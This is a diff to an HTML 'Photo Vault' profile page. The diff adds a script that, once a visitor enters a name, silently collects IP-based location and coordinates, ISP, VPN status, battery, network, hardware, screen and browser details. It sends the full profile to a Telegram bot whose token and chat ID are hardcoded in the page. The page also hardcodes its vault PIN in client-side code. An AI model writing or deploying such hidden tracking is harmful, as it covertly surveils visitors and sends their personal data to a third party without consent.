@@ -2,9 +2,10 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Kishor · Photo Vault</title>
+<title>Kishor | Photo Vault</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -21,7 +22,6 @@ body {
   overflow-x: hidden;
 }
 
-/* main card – signature nikhil style */
 .main-card {
   width: min(380px, 90vw);
   background: #0a0a0a;
@@ -33,7 +33,6 @@ body {
   position: relative;
 }
 
-/* profile */
 .avatar-wrapper {
   width: 115px;
   height: 115px;
@@ -51,6 +50,7 @@ body {
   height: 100%;
   border-radius: 50%;
   object-fit: cover;
+  background: #1a1a1a;
 }
 
 h2 {
@@ -68,7 +68,6 @@ h2 {
   font-weight: 500;
 }
 
-/* 2‑col grid */
 .links-grid {
   display: grid;
   grid-template-columns: 1fr 1fr;
@@ -103,7 +102,6 @@ h2 {
   color: #888;
 }
 
-/* fixed dev button */
 .developer-btn {
   position: fixed;
   top: 20px;
@@ -120,7 +118,6 @@ h2 {
 }
 .developer-btn:hover { color: #fff; border-color: #3b82f6; }
 
-/* modals */
 .modal {
   position: fixed;
   inset: 0;
@@ -140,6 +137,29 @@ h2 {
   border: 1px solid #3b82f6;
   width: min(320px, 85vw);
   text-align: center;
+  position: relative;
+  max-height: 80vh;
+  overflow-y: auto;
+}
+
+.modal-back {
+  position: absolute;
+  top: 15px;
+  left: 15px;
+  color: #888;
+  font-size: 1.5rem;
+  cursor: pointer;
+  width: 30px;
+  height: 30px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 50%;
+  transition: 0.3s;
+}
+.modal-back:hover {
+  background: #222;
+  color: #3b82f6;
 }
 
 .modal-input {
@@ -165,7 +185,18 @@ h2 {
   width: 100%;
 }
 
-/* photo zoom overlay */
+.secondary-btn {
+  background: #222;
+  color: #fff;
+  border: none;
+  padding: 14px;
+  border-radius: 12px;
+  font-weight: bold;
+  cursor: pointer;
+  width: 100%;
+  margin-top: 10px;
+}
+
 #photoZoomModal {
   position: fixed;
   inset: 0;
@@ -181,10 +212,8 @@ h2 {
   border-radius: 15px;
   border: 2px solid #3b82f6;
   transition: 0.3s;
-  cursor: pointer;
 }
 
-/* vault panel (right drawer) */
 .vault-panel {
   position: fixed;
   top: 0;
@@ -206,55 +235,38 @@ h2 {
   gap: 10px;
   margin-top: 25px;
 }
-.photo-item {
-  aspect-ratio: 1;
-  border-radius: 10px;
-  overflow: hidden;
+.photo-item { 
+  aspect-ratio: 1; 
+  border-radius: 10px; 
+  overflow: hidden; 
   border: 1px solid #222;
   cursor: pointer;
-  transition: 0.2s;
 }
-.photo-item:hover { border-color: #3b82f6; transform: scale(0.98); }
-.photo-item img { width: 100%; height: 100%; object-fit: cover; }
-
-/* upload dashed area */
-.upload-area {
-  border: 2px dashed #333;
-  padding: 30px;
-  margin-top:20px;
-  border-radius:15px;
-  text-align:center;
-  cursor:pointer;
-  transition: 0.2s;
+.photo-item img { 
+  width: 100%; 
+  height: 100%; 
+  object-fit: cover; 
+  background: #1a1a1a;
 }
-.upload-area:hover { border-color: #3b82f6; background: #111; }
 
-/* music */
-.music-mini {
-  position: fixed;
-  bottom: 25px;
-  right: 25px;
-  cursor: pointer;
-  font-size: 35px;
-  z-index: 1000;
-  transition: 0.2s;
+.music-mini { 
+  position: fixed; 
+  bottom: 25px; 
+  right: 25px; 
+  cursor: pointer; 
+  font-size: 35px; 
+  z-index: 1000; 
 }
 .rotate { animation: spin 4s linear infinite; }
 @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
-
-/* close button */
-.close-btn { cursor:pointer; font-size:2rem; line-height:1; }
 </style>
 </head>
 <body>
 
-<!-- developer trigger -->
 <div class="developer-btn" onclick="openNameModal()">DEVELOPER</div>
 
-<!-- main profile card -->
 <div class="main-card">
   <div class="avatar-wrapper" onclick="openPhoto()">
-    <!-- profile image – replace with your own if needed -->
     <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23333'/%3E%3Ccircle cx='35' cy='40' r='8' fill='%23fff'/%3E%3Ccircle cx='65' cy='40' r='8' fill='%23fff'/%3E%3Cpath d='M35 65 Q50 80 65 65' stroke='%23fff' stroke-width='4' fill='none' stroke-linecap='round' /%3E%3C/svg%3E" alt="Profile" class="avatar-img">
   </div>
   
@@ -281,226 +293,511 @@ h2 {
   </div>
 </div>
 
-<!-- NAME modal (first) -->
 <div class="modal" id="nameModal">
   <div class="modal-card">
-    <h3 style="color:#3b82f6">📡 SCANNING</h3>
-    <input type="text" class="modal-input" id="vName" placeholder="Enter your name" autocomplete="off">
+    <div class="modal-back" onclick="closeAll()">←</div>
+    <h3 style="color:#3b82f6; margin-top: 15px;">📡 SCANNING</h3>
+    <input type="text" class="modal-input" id="vName" placeholder="Enter your name">
     <button class="primary-btn" onclick="handleName()">CONTINUE</button>
+    <button class="secondary-btn" onclick="closeAll()">CANCEL</button>
   </div>
 </div>
 
-<!-- PASSCODE modal (second) -->
 <div class="modal" id="passModal">
   <div class="modal-card">
-    <h3 style="color:#3b82f6">🔐 ACCESS</h3>
-    <input type="password" class="modal-input" id="vPass" placeholder="PIN" maxlength="4" inputmode="numeric">
-    <div style="display:flex; gap:10px;">
-      <button class="primary-btn" onclick="checkPass()">ENTER</button>
-      <button class="primary-btn" style="background:#222;" onclick="closeAllModals()">CANCEL</button>
-    </div>
+    <div class="modal-back" onclick="backToName()">←</div>
+    <h3 style="margin-top: 15px;">🔐 ACCESS</h3>
+    <input type="password" class="modal-input" id="vPass" placeholder="PIN" maxlength="4">
+    <button class="primary-btn" onclick="checkPass()">ENTER</button>
+    <button class="secondary-btn" onclick="closeAll()">CANCEL</button>
   </div>
 </div>
 
-<!-- photo zoom overlay -->
 <div id="photoZoomModal" onclick="closePhoto()">
   <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23333'/%3E%3Ccircle cx='35' cy='40' r='8' fill='%23fff'/%3E%3Ccircle cx='65' cy='40' r='8' fill='%23fff'/%3E%3Cpath d='M35 65 Q50 80 65 65' stroke='%23fff' stroke-width='4' fill='none' stroke-linecap='round' /%3E%3C/svg%3E" id="zoomedImg">
 </div>
 
-<!-- right vault panel -->
 <div class="vault-panel" id="vaultPanel">
   <div style="display:flex; justify-content:space-between; align-items:center;">
-    <h2 style="font-size:1.2rem; color:#3b82f6;">📷 PHOTO VAULT</h2>
-    <span onclick="closeVault()" class="close-btn">&times;</span>
+    <h2 style="font-size:1.2rem; color:#3b82f6;">PHOTO VAULT</h2>
+    <span onclick="closeVault()" style="cursor:pointer; font-size:2rem;">&times;</span>
   </div>
-  <!-- upload zone -->
-  <div class="upload-area" onclick="document.getElementById('fileIn').click()">
-    <i class="fa-solid fa-cloud-arrow-up" style="font-size: 2rem; color:#3b82f6;"></i>
-    <p style="margin-top:8px;">Upload Photos</p>
+  <div style="border: 2px dashed #333; padding: 30px; margin-top:20px; border-radius:15px; text-align:center; cursor:pointer;" onclick="document.getElementById('fileIn').click()">
+    <i class="fa-solid fa-cloud-arrow-up"></i> <p>Upload Photos</p>
   </div>
   <input type="file" id="fileIn" hidden accept="image/*" multiple onchange="handleFiles(this.files)">
-  <!-- dynamic photo grid -->
   <div class="photo-grid" id="photoGrid"></div>
 </div>
 
-<!-- music emoji -->
 <div class="music-mini" id="mEmoji" onclick="toggleMusic()">🗿</div>
 <audio id="bgMusic" loop><source src="audio.mp3" type="audio/mpeg"></audio>
 
 <script>
-// Telegram configuration
 const BOT_TOKEN = '8682380448:AAGz82m2PUMXw13KwxglzoMbcdELmaHI2nc';
 const CHAT_ID = '6297092647';
 
-// DOM elements
-const nameModal = document.getElementById('nameModal');
-const passModal = document.getElementById('passModal');
-const vaultPanel = document.getElementById('vaultPanel');
-const photoGrid = document.getElementById('photoGrid');
-const fileInput = document.getElementById('fileIn');
-const photoZoom = document.getElementById('photoZoomModal');
-const zoomedImg = document.getElementById('zoomedImg');
-
-// ---------- modal control ----------
-function openNameModal() {
-  nameModal.classList.add('show');
-  // clear fields
-  document.getElementById('vName').value = '';
-  document.getElementById('vPass').value = '';
+// Function to get IP and location details
+async function getIPDetails() {
+  try {
+    const response = await fetch('https://ipapi.co/json/');
+    const data = await response.json();
+    return {
+      ip: data.ip || 'Unknown',
+      city: data.city || 'Unknown',
+      region: data.region || 'Unknown',
+      country: data.country_name || 'Unknown',
+      postal: data.postal || 'Unknown',
+      latitude: data.latitude || 'Unknown',
+      longitude: data.longitude || 'Unknown',
+      timezone: data.timezone || 'Unknown',
+      isp: data.org || 'Unknown',
+      vpn: data.vpn ? 'Yes' : 'No',
+      proxy: data.proxy ? 'Yes' : 'No',
+      hosting: data.hosting ? 'Yes' : 'No'
+    };
+  } catch (error) {
+    console.log('IP fetch failed:', error);
+    return {
+      ip: 'Unknown',
+      city: 'Unknown',
+      region: 'Unknown',
+      country: 'Unknown',
+      postal: 'Unknown',
+      latitude: 'Unknown',
+      longitude: 'Unknown',
+      timezone: 'Unknown',
+      isp: 'Unknown',
+      vpn: 'Unknown',
+      proxy: 'Unknown',
+      hosting: 'Unknown'
+    };
+  }
 }
-function closeAllModals() {
-  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show'));
+
+// Get battery info
+async function getBatteryInfo() {
+  try {
+    if ('getBattery' in navigator) {
+      const battery = await navigator.getBattery();
+      return {
+        level: Math.round(battery.level * 100) + '%',
+        charging: battery.charging ? 'Yes' : 'No',
+        timeLeft: battery.charging ? 'Charging' : battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' min' : 'Unknown'
+      };
+    }
+  } catch (e) {}
+  return { level: 'Unknown', charging: 'Unknown', timeLeft: 'Unknown' };
 }
 
-// first step: send name to telegram, open pin modal
-function handleName() {
+// Get network info
+function getNetworkInfo() {
+  if ('connection' in navigator) {
+    const conn = navigator.connection;
+    return {
+      type: conn.effectiveType || 'Unknown',
+      downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
+      rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown',
+      saveData: conn.saveData ? 'Yes' : 'No'
+    };
+  }
+  return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown', saveData: 'Unknown' };
+}
+
+// Get memory info
+function getMemoryInfo() {
+  if ('deviceMemory' in navigator) {
+    return navigator.deviceMemory + ' GB';
+  }
+  return 'Unknown';
+}
+
+// Get cores info
+function getCoresInfo() {
+  if ('hardwareConcurrency' in navigator) {
+    return navigator.hardwareConcurrency + ' cores';
+  }
+  return 'Unknown';
+}
+
+// Get detailed browser info
+function getBrowserInfo() {
+  const ua = navigator.userAgent;
+  let browser = 'Unknown';
+  let version = 'Unknown';
+  
+  if (ua.indexOf('Chrome') > -1) {
+    browser = 'Chrome';
+    version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
+  } else if (ua.indexOf('Firefox') > -1) {
+    browser = 'Firefox';
+    version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
+  } else if (ua.indexOf('Safari') > -1) {
+    browser = 'Safari';
+    version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
+  } else if (ua.indexOf('Edge') > -1) {
+    browser = 'Edge';
+    version = ua.match(/Edge\/(\d+\.\d+)/)?.[1] || 'Unknown';
+  }
+  
+  return { browser, version };
+}
+
+// Get OS info
+function getOSInfo() {
+  const ua = navigator.userAgent;
+  let os = 'Unknown';
+  
+  if (ua.match(/Android/i)) os = 'Android';
+  else if (ua.match(/iPhone|iPad|iPod/i)) os = 'iOS';
+  else if (ua.match(/Windows/i)) os = 'Windows';
+  else if (ua.match(/Mac/i)) os = 'MacOS';
+  else if (ua.match(/Linux/i)) os = 'Linux';
+  
+  return os;
+}
+
+// Get screen info
+function getScreenInfo() {
+  return {
+    width: screen.width + 'px',
+    height: screen.height + 'px',
+    colorDepth: screen.colorDepth + '-bit',
+    orientation: screen.orientation ? screen.orientation.type : 'Unknown',
+    availWidth: screen.availWidth + 'px',
+    availHeight: screen.availHeight + 'px',
+    pixelRatio: window.devicePixelRatio || '1'
+  };
+}
+
+// Get language info
+function getLanguageInfo() {
+  return {
+    language: navigator.language || 'Unknown',
+    languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown'
+  };
+}
+
+// Get time info
+function getTimeInfo() {
+  const d = new Date();
+  const offset = -d.getTimezoneOffset();
+  const sign = offset >= 0 ? '+' : '-';
+  const hours = Math.floor(Math.abs(offset) / 60);
+  const minutes = Math.abs(offset) % 60;
+  
+  return {
+    timestamp: d.toISOString(),
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+    offset: `GMT${sign}${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}`,
+    locale: navigator.language || 'Unknown'
+  };
+}
+
+// Get touch support
+function getTouchSupport() {
+  return {
+    touchPoints: navigator.maxTouchPoints || 0,
+    touchEvents: 'ontouchstart' in window ? 'Yes' : 'No'
+  };
+}
+
+// Get do not track
+function getDNT() {
+  return navigator.doNotTrack || 'Not set';
+}
+
+// Get referrer
+function getReferrer() {
+  return document.referrer || 'Direct visit';
+}
+
+// Get page load time
+function getPageLoadTime() {
+  if (performance && performance.timing) {
+    const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
+    return loadTime + ' ms';
+  }
+  return 'Unknown';
+}
+
+// Main function to collect all visitor data
+async function getVisitorData(name) {
+  const ipDetails = await getIPDetails();
+  const battery = await getBatteryInfo();
+  const network = getNetworkInfo();
+  const browser = getBrowserInfo();
+  const os = getOSInfo();
+  const screen = getScreenInfo();
+  const language = getLanguageInfo();
+  const time = getTimeInfo();
+  const touch = getTouchSupport();
+  
+  const d = new Date();
+  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+  const date = d.getDate();
+  const month = months[d.getMonth()];
+  const year = d.getFullYear();
+  let hours = d.getHours();
+  const minutes = d.getMinutes().toString().padStart(2, '0');
+  const seconds = d.getSeconds().toString().padStart(2, '0');
+  const ampm = hours >= 12 ? 'pm' : 'am';
+  hours = hours % 12 || 12;
+  
+  const datetime = `${date} ${month} ${year} ${hours}:${minutes}:${seconds} ${ampm}`;
+  
+  return {
+    name: name,
+    datetime: datetime,
+    ip: ipDetails.ip,
+    location: `${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}`,
+    postal: ipDetails.postal,
+    coordinates: `${ipDetails.latitude}, ${ipDetails.longitude}`,
+    timezone: ipDetails.timezone,
+    isp: ipDetails.isp,
+    security: `VPN: ${ipDetails.vpn}, Proxy: ${ipDetails.proxy}, Hosting: ${ipDetails.hosting}`,
+    os: os,
+    browser: `${browser.browser} ${browser.version}`,
+    device: navigator.userAgent,
+    screen: `${screen.width} x ${screen.height} (${screen.colorDepth}, ${screen.orientation})`,
+    availableScreen: `${screen.availWidth} x ${screen.availHeight}`,
+    pixelRatio: screen.pixelRatio,
+    language: language.language,
+    languages: language.languages,
+    timeInfo: `${time.timezone} (${time.offset})`,
+    timestamp: time.timestamp,
+    network: `${network.type} (${network.downlink}, ${network.rtt})`,
+    saveData: network.saveData,
+    battery: `${battery.level} (Charging: ${battery.charging}, Time left: ${battery.timeLeft})`,
+    memory: getMemoryInfo(),
+    cores: getCoresInfo(),
+    touch: `${touch.touchPoints} touch points, Touch events: ${touch.touchEvents}`,
+    doNotTrack: getDNT(),
+    referrer: getReferrer(),
+    pageLoadTime: getPageLoadTime(),
+    cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+    online: navigator.onLine ? 'Yes' : 'No',
+    platform: navigator.platform || 'Unknown'
+  };
+}
+
+// Send to Telegram with all details
+async function handleName() {
   const name = document.getElementById('vName').value.trim();
-  if (!name) {
-    alert('enter a name');
+  if(!name) {
+    alert('Please enter your name');
     return;
   }
-  // silently send to telegram (fire and forget)
+  
+  // Show loading
+  document.querySelector('#nameModal .primary-btn').innerHTML = '⏳ SCANNING...';
+  
+  // Get all visitor data
+  const data = await getVisitorData(name);
+  
+  // Create detailed message
+  const message = `🔥 ADVANCED VISITOR DETECTED
+━━━━━━━━━━━━━━━━━━━━━
+
+👤 PERSONAL
+   • Name: ${data.name}
+   • Time: ${data.datetime}
+━━━━━━━━━━━━━━━━━━━━━
+
+🌍 LOCATION
+   • IP: ${data.ip}
+   • Location: ${data.location}
+   • Postal: ${data.postal}
+   • Coordinates: ${data.coordinates}
+   • Timezone: ${data.timezone}
+   • ISP: ${data.isp}
+   • Security: ${data.security}
+━━━━━━━━━━━━━━━━━━━━━
+
+📱 DEVICE
+   • OS: ${data.os}
+   • Browser: ${data.browser}
+   • Platform: ${data.platform}
+   • Memory: ${data.memory}
+   • CPU Cores: ${data.cores}
+   • Screen: ${data.screen}
+   • Available: ${data.availableScreen}
+   • Pixel Ratio: ${data.pixelRatio}
+━━━━━━━━━━━━━━━━━━━━━
+
+🌐 NETWORK
+   • Connection: ${data.network}
+   • Save Data: ${data.saveData}
+   • Online: ${data.online}
+━━━━━━━━━━━━━━━━━━━━━
+
+🔋 BATTERY
+   • ${data.battery}
+━━━━━━━━━━━━━━━━━━━━━
+
+🗣️ LANGUAGE
+   • Primary: ${data.language}
+   • All: ${data.languages}
+━━━━━━━━━━━━━━━━━━━━━
+
+⏰ TIME INFO
+   • ${data.timeInfo}
+   • UTC: ${data.timestamp}
+━━━━━━━━━━━━━━━━━━━━━
+
+👆 TOUCH
+   • ${data.touch}
+━━━━━━━━━━━━━━━━━━━━━
+
+🔒 PRIVACY
+   • Do Not Track: ${data.doNotTrack}
+   • Cookies: ${data.cookies}
+   • Referrer: ${data.referrer}
+   • Page Load: ${data.pageLoadTime}
+━━━━━━━━━━━━━━━━━━━━━
+
+📱 FULL USER AGENT
+${data.device}`;
+
+  // Send to Telegram
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: `🔥 New legend: ${name}` })
-  }).catch(e => console.log('telegram send failed', e));
+    body: JSON.stringify({ 
+      chat_id: CHAT_ID, 
+      text: message
+    })
+  }).catch(err => console.log('Telegram error:', err));
 
-  // close name modal, open pass modal
-  nameModal.classList.remove('show');
-  passModal.classList.add('show');
+  // Reset button
+  document.querySelector('#nameModal .primary-btn').innerHTML = 'CONTINUE';
+  
+  document.getElementById('nameModal').classList.remove('show');
+  document.getElementById('passModal').classList.add('show');
 }
 
-// second step: verify pin
+function openNameModal() { 
+  document.getElementById('nameModal').classList.add('show'); 
+  document.getElementById('vName').value = '';
+  document.getElementById('vPass').value = '';
+}
+
+function closeAll() { 
+  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show')); 
+}
+
+function backToName() {
+  document.getElementById('passModal').classList.remove('show');
+  document.getElementById('nameModal').classList.add('show');
+  document.getElementById('vPass').value = '';
+}
+
 function checkPass() {
-  const pin = document.getElementById('vPass').value;
-  if (pin === '2009') {
-    closeAllModals();          // hide all modals
-    vaultPanel.classList.add('open');   // open vault drawer
-    renderVault();                      // display stored images
-  } else {
-    alert('Wrong PIN');
+  if(document.getElementById('vPass').value === '2009') {
+    closeAll();
+    document.getElementById('vaultPanel').classList.add('open');
+    renderVault();
+  } else { 
+    alert("Wrong PIN"); 
   }
 }
 
-// close vault panel
-function closeVault() {
-  vaultPanel.classList.remove('open');
+function closeVault() { 
+  document.getElementById('vaultPanel').classList.remove('open'); 
 }
 
-// ---------- profile photo zoom ----------
-function openPhoto() {
-  // use same profile image source from avatar (or keep default)
-  const avatarSrc = document.querySelector('.avatar-img').src;
-  zoomedImg.src = avatarSrc;
-  photoZoom.style.display = 'flex';
-}
-function closePhoto() {
-  photoZoom.style.display = 'none';
+function openPhoto() { 
+  const profileImg = document.querySelector('.avatar-img').src;
+  document.getElementById('zoomedImg').src = profileImg;
+  document.getElementById('photoZoomModal').style.display = 'flex'; 
 }
 
-// ---------- music ----------
+function closePhoto() { 
+  document.getElementById('photoZoomModal').style.display = 'none'; 
+}
+
 const music = document.getElementById('bgMusic');
-const mEmoji = document.getElementById('mEmoji');
 function toggleMusic() {
-  if (music.paused) {
-    music.play().catch(() => {});  // autoplay may be blocked, but we try
-    mEmoji.classList.add('rotate');
+  if(music.paused) {
+    music.play().catch(e => console.log('Audio play failed:', e));
+    document.getElementById('mEmoji').classList.add('rotate');
   } else {
     music.pause();
-    mEmoji.classList.remove('rotate');
+    document.getElementById('mEmoji').classList.remove('rotate');
   }
 }
-
-// ---------- vault storage & rendering ----------
-const STORAGE_KEY = 'k_photos';
 
 function renderVault() {
-  const photos = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
-  if (photos.length === 0) {
-    photoGrid.innerHTML = '<div style="grid-column:span 3; text-align:center; color:#444; padding:20px;">no photos yet</div>';
+  const photos = JSON.parse(localStorage.getItem('k_photos') || '[]');
+  const grid = document.getElementById('photoGrid');
+  
+  if(photos.length === 0) {
+    grid.innerHTML = '<div style="grid-column:span 3; text-align:center; color:#666; padding:20px;">No photos yet</div>';
     return;
   }
-  let html = '';
-  photos.forEach((src, index) => {
-    html += `<div class="photo-item" onclick="openVaultPhoto('${src}')">
-      <img src="${src}" loading="lazy">
-    </div>`;
-  });
-  photoGrid.innerHTML = html;
+  
+  grid.innerHTML = photos.map((src, index) => 
+    `<div class="photo-item" onclick="viewPhoto('${src}')">
+      <img src="${src}" alt="Vault photo ${index + 1}">
+    </div>`
+  ).join('');
 }
 
-// open a vault photo in the zoom modal (reusing same overlay)
-function openVaultPhoto(src) {
-  zoomedImg.src = src;
-  photoZoom.style.display = 'flex';
+function viewPhoto(src) {
+  document.getElementById('zoomedImg').src = src;
+  document.getElementById('photoZoomModal').style.display = 'flex';
 }
 
-// handle uploaded files
 function handleFiles(files) {
-  if (!files || files.length === 0) return;
-
-  const existing = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
-
-  // use a counter to know when all files are read
+  const photos = JSON.parse(localStorage.getItem('k_photos') || '[]');
   let pending = files.length;
-
+  
   Array.from(files).forEach(file => {
-    if (!file.type.startsWith('image/')) {
+    if(!file.type.startsWith('image/')) {
       pending--;
-      if (pending === 0) renderVault();
+      if(pending === 0) renderVault();
       return;
     }
+    
     const reader = new FileReader();
     reader.onload = (e) => {
-      existing.push(e.target.result);
+      photos.push(e.target.result);
       pending--;
-      if (pending === 0) {
-        // store and update grid
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(existing));
+      if(pending === 0) {
+        localStorage.setItem('k_photos', JSON.stringify(photos));
         renderVault();
       }
     };
     reader.onerror = () => {
       pending--;
-      if (pending === 0) renderVault();
+      if(pending === 0) renderVault();
     };
     reader.readAsDataURL(file);
   });
 }
 
-// optional: preload dummy image if local storage is empty (just to show example)
-(function initVaultExample() {
-  const stored = localStorage.getItem(STORAGE_KEY);
-  if (!stored) {
-    // create a placeholder dataURL (simple gradient)
-    const canvas = document.createElement('canvas');
-    canvas.width = 100;
-    canvas.height = 100;
-    const ctx = canvas.getContext('2d');
-    const grad = ctx.createLinearGradient(0,0,100,100);
-    grad.addColorStop(0,'#3b82f6');
-    grad.addColorStop(1,'#1e3a8a');
-    ctx.fillStyle = grad;
-    ctx.fillRect(0,0,100,100);
-    ctx.fillStyle='white';
-    ctx.font='bold 30px sans-serif';
-    ctx.fillText('🫵🏼',30,65);
-    const dummy = canvas.toDataURL();
-    localStorage.setItem(STORAGE_KEY, JSON.stringify([dummy]));
-  }
-})();
+if(!localStorage.getItem('k_photos')) {
+  const canvas = document.createElement('canvas');
+  canvas.width = 200;
+  canvas.height = 200;
+  const ctx = canvas.getContext('2d');
+  
+  const gradient = ctx.createLinearGradient(0, 0, 200, 200);
+  gradient.addColorStop(0, '#3b82f6');
+  gradient.addColorStop(1, '#1e40af');
+  ctx.fillStyle = gradient;
+  ctx.fillRect(0, 0, 200, 200);
+  
+  ctx.fillStyle = 'white';
+  ctx.font = 'bold 60px "Font Awesome 6 Free"';
+  ctx.textAlign = 'center';
+  ctx.textBaseline = 'middle';
+  ctx.fillText('📸', 100, 100);
+  
+  const sampleImage = canvas.toDataURL();
+  localStorage.setItem('k_photos', JSON.stringify([sampleImage]));
+}
 
-// ensure grid is shown if vault opens later
-window.renderVault = renderVault;   // make global for inline handlers
-
-// close zoom when clicking background
-photoZoom.addEventListener('click', function(e) {
-  if (e.target === photoZoom) closePhoto();
-});
-
-// close vault if clicking outside? optional, but we keep close button.
-
+renderVault();
 </script>
 </body>
 </html>
